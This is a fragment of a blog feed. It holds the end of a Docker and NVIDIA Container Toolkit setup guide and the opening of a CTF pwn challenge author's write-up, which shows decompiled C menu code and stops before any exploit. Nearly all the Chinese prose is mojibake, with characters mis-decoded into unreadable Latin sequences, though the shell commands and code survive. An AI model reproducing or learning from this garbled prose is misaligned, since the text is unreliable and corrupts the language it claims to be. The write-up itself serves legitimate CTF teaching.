shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> -u ç”¨æˆ·å -it å®¹å™¨åæˆ–å®¹å™¨ID /bin/bash</span><br></code></pre></td></tr></table></figure><h2 id="ä»å¤–éƒ¨è¿æ¥-docker-å®¹å™¨"><a href="#ä»å¤–éƒ¨è¿æ¥-docker-å®¹å™¨" class="headerlink" title="ä»å¤–éƒ¨è¿æ¥ docker å®¹å™¨"></a>ä»å¤–éƒ¨è¿æ¥ docker å®¹å™¨</h2><p>åœ¨å¯åŠ¨å®¹å™¨æ—¶æˆ‘ä»¬å·²ç»æŒ‡å®šäº†ä¸€ä¸ªå¤–éƒ¨ç«¯å£æ˜ å°„ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡è¯¥ç«¯å£è¿›è¡Œ ssh è¿æ¥ï¼Œæ“ä½œå’Œæ­£å¸¸ç™»å½•æœåŠ¡å™¨åŸºæœ¬ä¸€è‡´ï¼Œä¸è¿‡è¦æ‰‹åŠ¨æŒ‡å®šè¯¥å¤–éƒ¨ç«¯å£ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh å®¹å™¨å†…ç”¨æˆ·å@æœåŠ¡å™¨ä¸»æœºåæˆ–IP -p è‡ªå®šä¹‰çš„å¤–éƒ¨ç«¯å£</span><br></code></pre></td></tr></table></figure><h2 id="åˆ é™¤-docker-å®¹å™¨"><a href="#åˆ é™¤-docker-å®¹å™¨" class="headerlink" title="åˆ é™¤ docker å®¹å™¨"></a><strong>åˆ é™¤ docker å®¹å™¨</strong></h2><p>å¦‚æœ docker å†…ç¯å¢ƒé…å´©äº†ä¸æƒ³è¦äº†ï¼Œå¯ä»¥ç®€å•é€šè¿‡å¦‚ä¸‹å‘½ä»¤å°†è¯¥å®¹å™¨è¿›è¡Œåˆ é™¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker stop å®¹å™¨IDæˆ–å®¹å™¨å</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">rm</span> å®¹å™¨IDæˆ–å®¹å™¨å</span><br></code></pre></td></tr></table></figure><p>é‡æ–°åˆ›å»ºæ–°çš„å®¹å™¨ç¯å¢ƒå¯ä»¥ç›´æ¥å›åˆ°ç¬¬äºŒæ­¥ç»§ç»­è¿›è¡Œ</p><h2 id="åˆ é™¤-docker-é•œåƒ"><a href="#åˆ é™¤-docker-é•œåƒ" class="headerlink" title="åˆ é™¤ docker é•œåƒ"></a>åˆ é™¤ docker é•œåƒ</h2><p>å¦‚æœ docker é•œåƒæ„å»ºæ„Ÿè§‰ä¸å¤Ÿå¥½ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤åˆ é™¤å¯¹åº”é•œåƒï¼ˆéœ€ç¡®ä¿æ²¡æœ‰å®¹å™¨åœ¨ä½¿ç”¨è¯¥é•œåƒï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker rmi é•œåƒå</span><br></code></pre></td></tr></table></figure><p>åç»­ä½¿ç”¨åˆ™éœ€è¦å›åˆ°ç¬¬ä¸€æ­¥ä»å¤´å¼€å§‹</p><h1 id="0x02-åˆ›å»ºå¯ä»¥ä½¿ç”¨æ˜¾å¡çš„-docker-ç¯å¢ƒ"><a href="#0x02-åˆ›å»ºå¯ä»¥ä½¿ç”¨æ˜¾å¡çš„-docker-ç¯å¢ƒ" class="headerlink" title="0x02. åˆ›å»ºå¯ä»¥ä½¿ç”¨æ˜¾å¡çš„ docker ç¯å¢ƒ"></a>0x02. åˆ›å»ºå¯ä»¥ä½¿ç”¨æ˜¾å¡çš„ docker ç¯å¢ƒ</h1><p>æœ‰çš„æ—¶å€™ä¼šå­˜åœ¨éœ€è¦åœ¨æ˜¾å¡ä¸Šè·‘ä¸€äº›ä»»åŠ¡çš„éœ€æ±‚ï¼Œæœ¬èŠ‚è®²è¿°å¦‚ä½•åˆ›å»ºä¸€ä¸ªæŒ‚è½½äº†æ˜¾å¡çš„ docker å®¹å™¨</p><h2 id="What-is-NVIDIA-Container-Toolkit"><a href="#What-is-NVIDIA-Container-Toolkit" class="headerlink" title="What is NVIDIA Container Toolkit ?"></a>What is <code>NVIDIA Container Toolkit</code> ?</h2><p><a href="https://github.com/NVIDIA/nvidia-container-toolkit">NVIDIA Container Toolkit</a> æ˜¯ç”±è‹±ä¼Ÿè¾¾å¼€å‘çš„ä¸€å¥—å¯¹ docker è¿›è¡ŒåŒ…è£…çš„å·¥å…·ï¼Œä»è€Œä½¿å¾— docker å®¹å™¨å¯ä»¥ä½¿ç”¨æœåŠ¡å™¨ä¸»æœºä¸Šçš„æ˜¾å¡</p><p><img src="https://s2.loli.net/2023/08/31/dWpAu8LJQ2bOShg.png" alt="image.png"></p><h2 id="å®‰è£…-NVIDIA-Container-Toolk"><a href="#å®‰è£…-NVIDIA-Container-Toolk" class="headerlink" title="å®‰è£… NVIDIA Container Toolk"></a>å®‰è£… NVIDIA Container Toolk</h2><p>æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><h4 id="æ–¹æ³•-â‘ "><a href="#æ–¹æ³•-â‘ " class="headerlink" title="æ–¹æ³• â‘ "></a>æ–¹æ³• â‘ </h4><p>éœ€è¦åœ¨æœåŠ¡å™¨ä¸»æœºä¸Šå®Œæˆï¼Œé¦–å…ˆä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£…åŸºæœ¬ç»„ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update \</span><br><span class="language-bash">    &amp;&amp; sudo apt-get install -y nvidia-container-toolkit-base</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nvidia-ctk --version</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç”Ÿæˆ CDI ï¼ˆContainer Device Interfaceï¼‰è§„èŒƒæ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk cdi generate --output=/etc/cdi/nvidia.yaml</span><br></code></pre></td></tr></table></figure><p>æ·»åŠ  NVIDIA ä»“åº“ä¸ GPG å¯†é’¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">distribution=$(. /etc/os-release;<span class="hljs-built_in">echo</span> $ID<span class="hljs-variable">$VERSION_ID</span>) \</span><br><span class="language-bash">      &amp;&amp; curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey | sudo gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg \</span><br><span class="language-bash">      &amp;&amp; curl -s -L https://nvidia.github.io/libnvidia-container/<span class="hljs-variable">$distribution</span>/libnvidia-container.list | \</span><br><span class="language-bash">            sed <span class="hljs-string">&#x27;s#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g&#x27;</span> | \</span><br><span class="language-bash">            sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/nvidia-container-toolkit.list</span><br></code></pre></td></tr></table></figure><p>å®‰è£… toolkitï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y nvidia-container-toolkit</span><br></code></pre></td></tr></table></figure><p>é…ç½® docker daemon è¿›ç¨‹ä»¥è¯†åˆ« NVIDIA COntainer Runtimeï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk runtime configure --runtime=docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><p>æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker run --<span class="hljs-built_in">rm</span> --runtime=nvidia --gpus all nvidia/cuda:11.6.2-base-ubuntu20.04 nvidia-smi</span><br></code></pre></td></tr></table></figure><p>æœ€åæˆåŠŸè¾“å‡ºå’Œ <code>nvidia-smi</code> å‘½ä»¤ä¸€æ ·çš„ç»“æœå°±è¯´æ˜å®‰è£…æˆåŠŸäº†ï¼š</p><p><img src="https://s2.loli.net/2023/08/31/6BVStUv9jeCuimM.png" alt="image.png"></p><h4 id="æ–¹æ³•-â‘¡"><a href="#æ–¹æ³•-â‘¡" class="headerlink" title="æ–¹æ³• â‘¡"></a>æ–¹æ³• â‘¡</h4><blockquote><p>å‚è§ <a href="https://github.com/NVIDIA/nvidia-docker/issues/1238">Github ä¸Šçš„è¿™ä¸ª issue</a></p></blockquote><p>è‹¥æ–¹æ³• â‘  æ²¡æ³•æˆåŠŸè¿›è¡Œï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">distribution=$(. /etc/os-release;<span class="hljs-built_in">echo</span> $ID<span class="hljs-variable">$VERSION_ID</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add -</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -s -L https://nvidia.github.io/nvidia-docker/<span class="hljs-variable">$distribution</span>/nvidia-docker.list | sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/nvidia-docker.list</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update &amp;&amp; sudo apt-get install -y nvidia-container-toolkit</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h2 id="æ·»åŠ -NVIDIA-Rumtime"><a href="#æ·»åŠ -NVIDIA-Rumtime" class="headerlink" title="æ·»åŠ  NVIDIA Rumtime"></a>æ·»åŠ  NVIDIA Rumtime</h2><p>NVIDIA Container Runtime çš„æ·»åŠ ä¸€å…±æœ‰ä¸‰ç§æ–¹æ³•</p><h4 id="æ–¹æ³•-â‘ -1"><a href="#æ–¹æ³•-â‘ -1" class="headerlink" title="æ–¹æ³• â‘ "></a>æ–¹æ³• â‘ </h4><p>é¦–å…ˆåˆ›å»ºé…ç½®æ–‡ä»¶å¤¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mkdir</span> -p /etc/systemd/system/docker.service.d</span><br></code></pre></td></tr></table></figure><p>ç„¶ååˆ›å»ºé…ç½®æ–‡ä»¶ï¼Œæ³¨æ„è¿™æ¡å‘½ä»¤ä¸€å…±æœ‰äº”è¡Œï¼Œå…¨éƒ¨å¤åˆ¶åç²˜è´´è¿›å»ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">tee</span> /etc/systemd/system/docker.service.d/override.conf &lt;&lt;<span class="hljs-string">EOF</span></span><br>[Service]<br>ExecStart=<br>ExecStart=/usr/bin/dockerd --host=fd:// --add-runtime=nvidia=/usr/bin/nvidia-container-runtime<br>EOF<br></code></pre></td></tr></table></figure><p>é‡å¯ dockerï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•-â‘¡-1"><a href="#æ–¹æ³•-â‘¡-1" class="headerlink" title="æ–¹æ³• â‘¡"></a>æ–¹æ³• â‘¡</h4><p>Nvidia toolkit å®‰è£…æˆåŠŸä¹‹åä¹Ÿå¯ä»¥è¾…åŠ©æˆ‘ä»¬å®Œæˆè¿™ä¸€æ­¥ï¼Œé€šè¿‡å¦‚ä¸‹ä¸¤æ¡å‘½ä»¤å…¶ä¸­ä¹‹ä¸€å®Œæˆï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk runtime configure --runtime=docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk runtime configure --runtime=docker --set-as-default <span class="hljs-comment"># è®¾ç½®ä¸ºé»˜è®¤</span></span><br></code></pre></td></tr></table></figure><p>é‡å¯ dockerï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•-â‘¢"><a href="#æ–¹æ³•-â‘¢" class="headerlink" title="æ–¹æ³• â‘¢"></a>æ–¹æ³• â‘¢</h4><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ docker ç›´æ¥æ·»åŠ  NVIDIA Runtimeï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dockerd --add-runtime=nvidia=/usr/bin/nvidia-container-runtime [...]</span><br></code></pre></td></tr></table></figure><h2 id="é…ç½®å¸¦-CUDA-çš„-docker-é•œåƒ"><a href="#é…ç½®å¸¦-CUDA-çš„-docker-é•œåƒ" class="headerlink" title="é…ç½®å¸¦ CUDA çš„ docker é•œåƒ"></a>é…ç½®å¸¦ CUDA çš„ docker é•œåƒ</h2><h2 id="åˆ›å»ºå¹¶å¯åŠ¨å¸¦æ˜¾å¡çš„-Docker-å®¹å™¨"><a href="#åˆ›å»ºå¹¶å¯åŠ¨å¸¦æ˜¾å¡çš„-Docker-å®¹å™¨" class="headerlink" title="åˆ›å»ºå¹¶å¯åŠ¨å¸¦æ˜¾å¡çš„ Docker å®¹å™¨"></a>åˆ›å»ºå¹¶å¯åŠ¨å¸¦æ˜¾å¡çš„ Docker å®¹å™¨</h2><p>ä¸ <code>0x01</code> ä¸­çš„åˆ›å»º docker å®¹å™¨çš„æ­¥éª¤åŸºæœ¬ç›¸åŒï¼Œä¸è¿‡éœ€è¦æ·»åŠ é¢å¤–çš„å‚æ•°</p><blockquote><p>æ›´å¤šç”¨æ³•å‚è§ <a href="https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/user-guide.html%EF%BC%8C%E6%9C%AC%E6%96%87%E4%BB%85%E5%B1%95%E7%A4%BA%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95">https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/user-guide.htmlï¼Œæœ¬æ–‡ä»…å±•ç¤ºåŸºæœ¬ç”¨æ³•</a></p></blockquote><h3 id="ä½¿ç”¨-Nvidia-Runtime"><a href="#ä½¿ç”¨-Nvidia-Runtime" class="headerlink" title="ä½¿ç”¨ Nvidia Runtime"></a>ä½¿ç”¨ Nvidia Runtime</h3><ul><li>å®¹å™¨å†…æŒ‚è½½æ‰€æœ‰çš„æ˜¾å¡</li></ul><p>é€šè¿‡é¢å¤–æ·»åŠ  <code>--runtime=nvidia -e NVIDIA_VISIBLE_DEVICES=all</code> å‚æ•°å®Œæˆï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;å¤–éƒ¨ç«¯å£:22&quot;</span> -h <span class="hljs-string">&quot;å®¹å™¨ä¸»æœºå&quot;</span> --name=<span class="hljs-string">&quot;å®¹å™¨å&quot;</span> --runtime=nvidia -e NVIDIA_VISIBLE_DEVICES=all è‡ªå®šä¹‰é•œåƒå</span><br></code></pre></td></tr></table></figure><ul><li>å®¹å™¨å†…æŒ‚è½½æŒ‡å®šæ˜¾å¡</li></ul><p>é€šè¿‡é¢å¤–æ·»åŠ  <code>--runtime=nvidia -e NVIDIA_VISIBLE_DEVICES=æ˜¾å¡æ ‡å·</code> å‚æ•°å®Œæˆï¼Œå…¶ä¸­æ˜¾å¡æ ‡å·ä¸º <code>nvidia-smi -L</code> å‘½ä»¤ä¸­æ‰€å±•ç¤ºçš„åºå·ï¼ŒæŒ‚è½½å¤šå¼ æ˜¾å¡éœ€è¦ç”¨ <code>,</code> è¿›è¡Œéš”ç¦»ï¼ˆ<strong>æ˜¾å¡æ ‡å·é—´ä¸è¦åŠ ç©ºæ ¼</strong> ï¼‰ï¼Œè¿™é‡Œä»¥æŒ‚è½½ç¬¬ä¸€ã€äºŒå¼ æ˜¾å¡ä¸ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;å¤–éƒ¨ç«¯å£:22&quot;</span> -h <span class="hljs-string">&quot;å®¹å™¨ä¸»æœºå&quot;</span> --name=<span class="hljs-string">&quot;å®¹å™¨å&quot;</span> --runtime=nvidia -e NVIDIA_VISIBLE_DEVICES=0,1 è‡ªå®šä¹‰é•œåƒå</span><br></code></pre></td></tr></table></figure><h3 id="ä¼ ç»Ÿç”¨æ³•"><a href="#ä¼ ç»Ÿç”¨æ³•" class="headerlink" title="ä¼ ç»Ÿç”¨æ³•"></a>ä¼ ç»Ÿç”¨æ³•</h3><ul><li>å®¹å™¨å†…æŒ‚è½½æ‰€æœ‰çš„æ˜¾å¡</li></ul><p>é¢å¤–æ·»åŠ  <code>--gpus all</code> å‚æ•°å³å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;å¤–éƒ¨ç«¯å£:22&quot;</span> -h <span class="hljs-string">&quot;å®¹å™¨ä¸»æœºå&quot;</span> --name=<span class="hljs-string">&quot;å®¹å™¨å&quot;</span> --gpus all è‡ªå®šä¹‰é•œåƒå</span><br></code></pre></td></tr></table></figure><ul><li>å®¹å™¨å†…æŒ‚è½½æŒ‡å®šæ˜¾å¡</li></ul><p>é€šè¿‡é¢å¤–æ·»åŠ  <code>--gpus=&#39;&quot;device=æ˜¾å¡æ ‡å·&quot;&#39;</code> å‚æ•°å®Œæˆï¼Œå…¶ä¸­æ˜¾å¡æ ‡å·ä¸º <code>nvidia-smi -L</code> å‘½ä»¤ä¸­æ‰€å±•ç¤ºçš„åºå·ï¼Œä»¥ä¸‹å‘½ä»¤ä»¥ç¬¬ä¸€å¼ æ˜¾å¡ä¸ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;å¤–éƒ¨ç«¯å£:22&quot;</span> -h <span class="hljs-string">&quot;å®¹å™¨ä¸»æœºå&quot;</span> --name=<span class="hljs-string">&quot;å®¹å™¨å&quot;</span> --gpus=<span class="hljs-string">&#x27;&quot;device=0&quot;&#x27;</span> è‡ªå®šä¹‰é•œåƒå</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ€ä¹ˆå®éªŒå®¤åªæœ‰ğŸ‘´ä¸€ä¸ªè¿ç»´&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="è¿ç»´" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="Docker" scheme="https://arttnba3.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTF.0x09ã€‘CISCN 2023 åä¸œåŒ—åˆ†åŒºèµ› minidbã€kkk å‡ºé¢˜æ‰‹è®°</title>
    <link href="https://arttnba3.github.io/2023/07/14/CTF-0X09_CISCN_2023_HDBFQS/"/>
    <id>https://arttnba3.github.io/2023/07/14/CTF-0X09_CISCN_2023_HDBFQS/</id>
    <published>2023-07-13T23:43:35.000Z</published>
    <updated>2023-12-18T06:58:40.869Z</updated>
    
    <content type="html"><![CDATA[<p>å…¸ä¸­å…¸ä¹‹ä½è´¨é‡å¥—è·¯ Pwn é¢˜é›†åˆ</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>ç¬¬ä¸€æ¬¡å¸®å›½èµ›å‡ºé¢˜ï¼ˆ<del>ä¸»è¦æ˜¯å¬è¯´æœ‰ğŸ’´æ°</del>ï¼‰ï¼Œä¸å‡ºæ„å¤–çš„è¯åº”è¯¥ä¹Ÿæ˜¯æœ¬ç§‘é˜¶æ®µæœ€åä¸€æ¬¡å‡º CTF Pwn é¢˜ç›®äº†ï¼ŒåŒæ—¶è¿™ä¹Ÿæ˜¯ç¬”è€…ç¬¬ä¸€æ¬¡å‡º AWDP çš„é¢˜ç›®ï¼Œæ„Ÿè§‰è¿˜æ˜¯æœ‰ç‚¹æ„æ€çš„ ï¼šï¼‰</p><p>å› ä¸ºçŸ­æ—¶é—´å†…ç¡®å®æ˜¯æƒ³ä¸å‡ºä»€ä¹ˆæ–°ä¸œè¥¿äº†æ‰€ä»¥å‡ºäº†ä¸¤é“æ¯”è¾ƒå¥—è·¯åŒ–çš„é¢˜ç›®ï¼Œå¯æƒœè§£é¢˜ç‡ä¼¼ä¹æœ‰ç‚¹ä¸å°½äººæ„ï¼Œä¼°è®¡å¤§ä½¬ä»¬åº”è¯¥éƒ½ä¸å±‘äºåšç¬”è€…å‡ºçš„çƒ‚é¢˜å§ :ï¼ˆ</p><h1 id="0x01-minidbï¼ˆç®€å•ï¼‰"><a href="#0x01-minidbï¼ˆç®€å•ï¼‰" class="headerlink" title="0x01. minidbï¼ˆç®€å•ï¼‰"></a>0x01. minidbï¼ˆç®€å•ï¼‰</h1><p>è¿™é“é¢˜å‡ºé¢˜æ—¶çš„éš¾åº¦è®¾ç½®ä¾¿æ˜¯ <code>ç®€å•</code> ï¼Œæ‰€ä»¥ç¬”è€…æ˜¯æŒ‰ç…§ç­¾åˆ°é¢˜çš„éš¾åº¦å»å‡ºçš„ï¼Œä¸è¿‡è™½ç„¶æˆåŠŸ <code>fix</code> çš„é˜Ÿä¼ä¸å°‘ï¼Œä½†æ˜¯æˆåŠŸ <code>break</code> çš„é˜Ÿä¼ä¼¼ä¹å¹¶å¦‚é¢„æœŸä¸å¤šğŸ¤”ï¼ˆ<del>ä¿®éƒ½ä¿®äº†æ‰“è¿˜ä¸ä¼šæ‰“ğŸï¼Œä½ ä»¬æ˜¯ä¸æ˜¯å·å·è—äº†ä»€ä¹ˆğŸ‘´ä¸çŸ¥é“çš„é€šé˜²æ‰‹æ®µ</del>ï¼‰</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>é¦–å…ˆè¿˜æ˜¯æƒ¯ä¾‹ä¿®ä¸ªè·³è¡¨ï¼š</p><p><img src="https://s2.loli.net/2023/07/07/VpuMXz3L9vFgiRC.png" alt="IDA ä¿®å¤è·³è¡¨.png"></p><p>æä¾›äº†ä¸¤å±‚å †èœå•ï¼Œç¬¬ä¸€å±‚å¯ä»¥è®©ç”¨æˆ·åˆ›å»ºã€ä½¿ç”¨ã€åˆ é™¤ã€å±•ç¤ºã€é‡å‘½åæ•°æ®åº“ï¼š</p><p><img src="https://s2.loli.net/2023/07/12/tbZT75vorwOKMnj.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1547</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v3 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    sub_139F();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>    v2 = v1;<br>    <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">5</span> )<br>    &#123;<br>LABEL_6:<br>      <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">666</span> )<br>        <span class="hljs-keyword">continue</span>;<br>LABEL_15:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid choice!\x1B[0m&quot;</span>);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)v2 &lt;= <span class="hljs-number">0</span> || v2 &gt; <span class="hljs-number">5</span> )<br>      <span class="hljs-keyword">goto</span> LABEL_15;<br>    <span class="hljs-keyword">switch</span> ( v2 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0u</span>:<br>        <span class="hljs-keyword">goto</span> LABEL_15;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        sub_1D38();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> 